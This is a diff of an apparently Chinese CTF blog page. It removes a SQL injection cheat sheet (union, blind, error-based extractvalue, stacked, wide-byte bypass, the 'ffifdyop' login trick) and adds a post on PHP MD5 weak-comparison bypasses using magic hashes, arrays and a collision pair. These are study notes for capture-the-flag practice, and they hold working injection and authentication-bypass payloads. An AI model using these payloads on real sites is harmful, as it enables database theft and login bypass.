@@ -109,131 +109,29 @@
         <div class="content-wrapper">
           <div id="content" class="content"><section id="posts" class="posts"><article class="post">
     <header class="post-header">
-      <h1 class="post-title"><a class="post-link" href="/2020/09/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%8F%E9%AA%8C%E5%A4%A7%E6%9D%82%E7%83%A9/">Experience summary of SQL injection</a>
+      <h1 class="post-title"><a class="post-link" href="/2020/10/22/web-md5%E5%BC%B1%E7%B1%BB%E5%9E%8B/">PHP Weak type about MD5</a>
         </h1>
 
       <div class="post-meta">
         <span class="post-time">
-          2020-09-29
+          2020-10-22
         </span><span class="post-category">
             <a href="/categories/WebSummary/">WebSummary</a>
             </span>
         </div>
     </header>
 
-    <div class="post-content"><h2 id="一般注入"><a href="#一般注入" class="headerlink" title="一般注入"></a>一般注入</h2><p>通过修改参数的值, 例如<strong>正常数字 大数字 字符 单引号 双引号 括号 反斜杠等等</strong>来探测是否存在注入点. 如果有报错信息, 则可以根据报错信息还原SQL语句.</p>
+    <div class="post-content"><p>主要就是对一些在PHP中MD5值判断的漏洞的积累吧(<del>每次都要查payload很麻烦的</del></p>
 <blockquote>
-<p>例如在数字后面加 ‘ 不行则可以试试加 \</p>
+<p>为了方便, 文章中的所有变量都不带$</p>
 </blockquote>
-<h3 id="注入操作-找到注入点并还原SQL语句后"><a href="#注入操作-找到注入点并还原SQL语句后" class="headerlink" title="注入操作(找到注入点并还原SQL语句后)"></a>注入操作(找到注入点并还原SQL语句后)</h3><ol>
-<li>利用<code>order by</code>来判断字段数(联合查询需要相同的字段)</li>
-<li>得到字段数后, 判断显位. 例如<code>url?id=-1&#39; union select 1,2,3</code>, 观察哪个数字会显示出来.</li>
-<li>获取数据库名(显位是2的情况下,下面也是)</li>
-</ol>
-<ul>
-<li><code>union select 1,database(),3</code></li>
-<li><code>select 1 , group_concat(schema_name) , 3 from information_schema.schemata</code></li>
-</ul>
-<ol start="4">
-<li>列出数据库中所有表(假设库名是test)</li>
-</ol>
-<ul>
-<li><code>select group_concat(table_name) from information_schema.tables where table_schema = test</code> 如果不行 可以试试<code>&#39;test&#39;</code> <code>0x674657374</code>(把test转成十六进制) <code>database()</code></li>
-</ul>
-<ol start="5">
-<li>列出所有字段</li>
-</ol>
-<ul>
-<li>select group_concat(column_name) from information_schema,columns where table_name = </li>
-</ul>
-<ol start="6">
-<li>爆数据就完事了</li>
-</ol>
-<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>跟一般注入的区别在于, 服务端不再返回报错内容, 注入的时候只能知道自己输入的语句是否出错, 而且也不能直接得到库名表名这些. 盲注一般分为两种, 一种是基于布尔的, 一种是基于时间的.</p>
-<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>使用盲注得知道一些函数: </p>
-<ul>
-<li>ascii(str): str是一个字符串参数，返回值为其最左侧字符的ascii码。通过它，我们才能确定特定的字符。</li>
-<li>substr(str,start,len): 这个函数是取str中从下标start开始的，长度为len的字符串。通常在盲注中用于取出单个字符，交给ascii函数来确定其具体的值。</li>
-<li>length(str): 这个函数是用来获取str的长度的。这样我们才能知道需要通过substr取到哪个下标。</li>
-<li>count([column]): 统计记录的数量，其在盲注中，主要用于判断符合条件的记录的数量，并逐个破解。</li>
-<li>if(condition,a,b): 当condition为true的时候，返回a，当condition为false的时候，返回b。</li>
-<li>sleep(n): 服务端等待n秒后返回记录, 在时间盲注中, 用于判断语句是否正确.</li>
-<li>benchmark(times, func): 执行times次func, 也用于时间盲注, 通过服务端的反应时间来判断语句是否正确.</li>
-</ul>
-<h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>基于布尔的盲注是根据页面差来进行判断注入和数据注入的。在存在注入的页面输入and (true)则返回页面1；输入and (false)则返回页面2，而页面1和页面2有差别，常见的情况页面1是正常页面，页面2是错误页面</p>
-<h4 id="注入操作"><a href="#注入操作" class="headerlink" title="注入操作"></a>注入操作</h4><ol>
-<li>获取用户名<ol>
-<li>猜用户名的长度<br><code>and(select length(user()))=数字</code>, 不断尝试不同的数字得到用户名的长度</li>
-<li>逐位猜解用户名<br><code> and (select ascii(mid(user(),位数,1)))=114</code>, 猜测在某个位置的字母的ASCII码为114. 通过观察返回的页面来判断每一位的字母, 最终得到用户名</li>
-</ol>
-</li>
-<li>获取当前数据库的库名<ol>
-<li>猜库名长度<br><code>and (select length(database()))=数字</code></li>
-<li>逐位猜解库名<br><code>and (select ascii(mid(database(),位数,1)))=116</code></li>
-</ol>
-</li>
-<li>获取表名<ol>
-<li>判断表的数量<br><code>and (select count(table_name) from information_schema.tables where table_schema=database())=4</code>,这条语句就是判断数据库中有4张表</li>
-<li>判断表名的长度<br><code>and (select length(table_name) from information_schema.tables where table_schema=database() limit 位数,1)=5</code>, 位数指的是第几张表</li>
-<li>逐位拆解表名<br><code>and (select ascii(mid(table_name,表名的第几位,1)) from information_schema.tables wheretable_schema=database() limit 第几张表,1)=100</code></li>
-</ol>
-</li>
-<li>获取列名<ol>
-<li>判断列的数量<br><code>and (select count(column_name) form information_schema.columns where table_schema=表名)=数字</code></li>
-<li>判断列的长度<br><code>and (select length(column_name) form information_schema.columns where table_schema=表名 limit 第几列,1)=数字</code></li>
-<li>逐位猜解列名<br><code>and (select ascii(mid(column_name,第几个字母,1)) form information_schema.columns where table_schema=表名 limit 第几列,1)=数字</code></li>
-</ol>
-</li>
-<li>获取数据<ol>
-<li>判断数据的条数<br><code>and (select conut(列名) from 表名)=数字</code></li>
-<li>判断数据的长度<br><code>and (select length(列名) from 表名 limit 第几条,1)=数字</code></li>
-<li>逐位猜解数据<br><code>and (select ascii(mid(列名,第几个字母,1)) from 表名 limit 第几条,1)=数字</code></li>
-</ol>
-</li>
-</ol>
-<p><strong>事实上,以上语句中的’=’都可以用’&lt;’和’&gt;’来代替以便于更快的确定数据</strong>, 而且手工注入往往需要大量的尝试, 这非常的<del>操蛋</del>繁琐, 一般可以写脚本来注入</p>
-<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>利用<code>sleep()</code>或<code>benchmark()</code>等函数让mysql执行时间变长经常与<code>if(expr1,expr2,expr3)</code>语句结合使用, 通过页面的响应时间来判断条件是否正确. <code>if(expr1,expr2,expr3)</code>含义是如果<code>expr1</code>是<code>True</code>, 则返回<code>expr2</code>, 否则返回<code>expr3</code>.</p>
-<h4 id="注入操作-1"><a href="#注入操作-1" class="headerlink" title="注入操作"></a>注入操作</h4><p><del>反正也不会真的去手工注入</del><strong>sqlmap即可</strong></p>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入有很多很多(至少我在网上查找资料的时候看见了很多), 一边做题, 一边把遇到的报错注入的方法进行总结吧.<br><strong>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中</strong></p>
-<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
-<li>通过<code>extractvalue()</code>或<code>updatexml()</code>函数</li>
-</ul>
-<h3 id="通过extractvalue-或updatexml-函数"><a href="#通过extractvalue-或updatexml-函数" class="headerlink" title="通过extractvalue()或updatexml()函数"></a>通过<code>extractvalue()</code>或<code>updatexml()</code>函数</h3><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><ol>
-<li>当union被过滤的时候</li>
-</ol>
-<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><code>extractvalue()</code> :对XML文档进行查询的函数<br><code>udatexml()</code> :对XML文档进行更新的函数<br>语法：</p>
-<ul>
-<li><code>extractvalue(文档，路径)</code></li>
-<li><code>updatexml(目标xml文档，xml路径，更新的内容)</code></li>
-<li><em>路径写入其他格式，就会报错并且会返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容</em>*</li>
-</ul>
-<h4 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查数据库名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">爆表名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))</span><br><span class="line">爆字段名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))</span><br><span class="line">爆数据：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br></pre></td></tr></table></figure>
-
-<h5 id="例题-buuctf-极客大挑战-hardsql"><a href="#例题-buuctf-极客大挑战-hardsql" class="headerlink" title="例题: buuctf 极客大挑战 hardsql"></a>例题: buuctf 极客大挑战 hardsql</h5><p>情景: <code>order by</code> <code>union</code> <code>空格</code> <code>and</code> 被过滤<br>查字段名时候的payload:<code>?username=44&amp;password=1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))%23</code>   </p>
-<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>在正常的语句后面加分号( ; ),可顺序执行多条语句, 从而造成注入漏洞.<br>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
-<p>堆叠注入可以搭配一些语句来绕过对某些关键词的过滤: </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;show databases     			------列出所有数据库</span><br><span class="line">;show tables        			------列出所有表</span><br><span class="line">;show columns from table_name		------列出某个表的所有字段</span><br><span class="line">;desc table_name</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="通过RENAME更改flag所在表名为默认查询的表名"><a href="#通过RENAME更改flag所在表名为默认查询的表名" class="headerlink" title="通过RENAME更改flag所在表名为默认查询的表名"></a>通过<code>RENAME</code>更改flag所在表名为默认查询的表名</h2><p>更改表名:</p>
-<blockquote>
-<p><code>rename table tbl_name to new_tbl_name</code><br><code>alter table table_name to new name</code></p>
-</blockquote>
-<p>更改列名</p>
-<blockquote>
-<p><code>alter table t_app change name app_name varchar(20)</code></p>
-</blockquote>
-<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>利用编码转换, 将服务器端强制添加的本来用于转义的\符号吃掉, 从而能使攻击者输入的引号起到闭合作用, 以至于可以进行SQL注入.</p>
-<h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><p>如在进行<code>url?id=1&#39;</code>等操作时, 发现无论如何都不报错, 或者报错了莫名其妙的多出了有, 此时就可以使用<code>url?id=1%df&#39;</code>, 这时服务端会在’前面添加一个, \的ASCII码为0x5c, 因为前面的%df大于128, 服务端会将0xdf和0x5c合并成0xdf5c即汉字 “运”, 从而达到了绕过\转义’的目的</p>
-<h3 id="PHP预处理"><a href="#PHP预处理" class="headerlink" title="PHP预处理"></a>PHP预处理</h3><p>使用concat(char(num,num,num)) 即使用ascii码转成字符再拼接来绕过对某些关键词的过滤.</p>
-<h1 id="SQLite注入"><a href="#SQLite注入" class="headerlink" title="SQLite注入"></a>SQLite注入</h1><p>与sql不同的是, sqlite少了一些函数, 比如database()等等, 而且如果使用了不存在的函数也无法爆出库名.<br>但是sqlite存在一个sqlite_master表, 里面的字段为type/name/tbl_name/rootpage/sql<br>可以通过查询该表内信息得到表名, 并且可以通过sql字段内的sql语句得到对应表内的字段</p>
-<h1 id="一些奇怪的总结"><a href="#一些奇怪的总结" class="headerlink" title="一些奇怪的总结???"></a>一些奇怪的总结???</h1><h2 id="jarvis-oj-login"><a href="#jarvis-oj-login" class="headerlink" title="jarvis oj - login"></a>jarvis oj - login</h2><p>这是一道要用万能密码登录的题<br>sql语句是:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</span><br></pre></td></tr></table></figure>
-<p>php的md5()这个函数, 可以有第二个参数, 如果是true, 则回返回原始的二进制数据, 也就是原本md5出来的32位十六进制字符串转成真正的十六字节的字符串.<br>那么这里要登录进去, 需要把语句构造成:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&#39;or&#39;1&#39;&quot; </span><br><span class="line"># or后面的1可以换成别的, 只要是一个字符串就好了</span><br></pre></td></tr></table></figure>
-<p>然后这里用到了一个字符串<code>ffifdyop</code>, 为啥用这个呢? 因为<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-794d608806ba4f49b52e2d5359f60040.png" alt="图片.png"><br>如果<code>$pass=ffifdyop</code>, 那么语句就会变成</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&#39;or&#39;6&#39;&quot; </span><br></pre></td></tr></table></figure>
-
-<p>这样就能登录啦</p>
+<h2 id="1-a-b-and-md5-a-md5-b"><a href="#1-a-b-and-md5-a-md5-b" class="headerlink" title="1. a != b and md5(a) == md5(b)"></a>1. a != b and md5(a) == md5(b)</h2><p>用==来判断两个变量(<del>这样写肯定会被学长骂的!!!</del>, 怎么绕过呢?<br>先给出两个字符串吧<code>QNKCDZO</code> 和 <code>240610708</code> 而这两个字符串的MD5值为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br></pre></td></tr></table></figure>
+<p>PHP在处理哈希字符串时, 它把每一个以“0E”开头的哈希值都解释为0, 具体的原因呢是因为0e开头会被认为是科学计数法, e后面的数会被认为是次幂, 而不管0乘10的几次幂都是0. 所以如果两个不同的密码经过哈希以后, 其哈希值都是以“0E”开头的, 那么PHP将会认为他们相同, 都是0.</p>
+<h2 id="2-a-b-and-md5-a-md5-b"><a href="#2-a-b-and-md5-a-md5-b" class="headerlink" title="2. a !== b and md5(a) === md5(b)"></a>2. a !== b and md5(a) === md5(b)</h2><p>要通过这个判断, 要利用MD5不能处理数组这个漏洞, 就是说当a和b都是数组的时候, md5(a) === md5(b) 会判断为真. 至于怎么让a !== b, <code>a[]=1;b[]=2</code>就行了.</p>
+<h2 id="3-string-a-string-b-and-md5-a-md5-b"><a href="#3-string-a-string-b-and-md5-a-md5-b" class="headerlink" title="3. (string)a !== (string)b and md5(a) === md5(b)"></a>3. (string)a !== (string)b and md5(a) === md5(b)</h2><p>啊这…这个可以直接去找两个相等md5的字符串.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Param1</span>=<span class="string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span>;</span><br><span class="line"><span class="variable">$Param2</span>=<span class="string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span>;</span><br><span class="line"><span class="comment">#008ee33a9d58b51cfeb425b0959121c9</span></span><br></pre></td></tr></table></figure>
+<p>使用的时候记得直接添加到包里面去, 浏览器上输入是无效的</p>
 
         </div></article>
       <nav class="pagination"><a class="prev" href="/page/17/">
